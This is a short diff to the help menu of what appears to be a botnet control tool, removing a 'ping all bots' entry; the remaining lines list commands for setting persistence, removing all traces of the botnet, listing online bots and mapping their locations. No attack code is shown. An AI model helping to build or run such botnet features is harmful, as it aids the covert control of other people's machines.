@@ -10,7 +10,6 @@
           ║     kill                                       ║     Stop client from listening                ║
           ║     persistence                                ║     Set persistence                           ║
           ║     selfdestruct                               ║     Remove all traces of the BotNet           ║
-          ║     ping                                       ║     Ping all bots                             ║
           ║     list                                       ║     List online bots                          ║
           ║     map                                        ║     View all bots general location on map     ║
           ║     clear                                      ║     Clear console                             ║
